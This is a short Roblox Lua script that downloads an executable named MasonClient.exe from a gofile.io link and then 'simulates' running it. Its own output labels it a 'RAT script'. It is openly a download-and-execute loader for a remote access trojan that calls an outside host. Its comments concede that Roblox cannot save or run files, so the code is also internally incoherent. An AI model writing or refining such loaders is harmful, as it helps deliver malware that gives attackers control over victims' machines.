-- Roblox Lua script with improved error handling for downloading an .exe
local HttpService = game:GetService("HttpService")

-- Use your provided URL
local exeUrl = "https://store5.gofile.io/download/web/be9b9b92-d4e0-422c-b71b-40faf37a4723/MasonClient.exe"
-- Descriptive path (still theoretical, Roblox can't save files)
local savePath = "MasonClient.exe"

-- Function to check if a URL is valid
local function isUrlValid(url)
    local success, result = pcall(function()
        local response = HttpService:GetAsync(url, true)
        return response ~= nil
    end)
    return success
end

-- Function to download the file
local function downloadFile(url, path)
    if not HttpService.HttpEnabled then
        warn("Error: HTTP requests are disabled. Enable in Game Settings > Security > Allow HTTP Requests.")
        return false
    end

    if not isUrlValid(url) then
        warn("Error: Invalid or inaccessible URL: " .. url)
        return false
    end

    local success, response = pcall(function()
        return HttpService:GetAsync(url, true)
    end)

    if success then
        print("Download successful! Received " .. #response .. " bytes.")
        warn("Roblox does not allow file system access. File save to '" .. path .. "' simulated.")
        return true, response
    else
        warn("Download failed: " .. tostring(response))
        return false
    end
end

-- Function to simulate execution
local function executeFile(path)
    warn("Roblox security prevents executing .exe files. Execution of '" .. path .. "' simulated.")
    print("Simulated running: " .. path)
end

-- Main execution
print("Starting RAT script...")
local downloadSuccess, responseData = downloadFile(exeUrl, savePath)
if downloadSuccess then
    print("Proceeding to execution...")
    executeFile(savePath)
else
    warn("Script failed due to download error.")
end
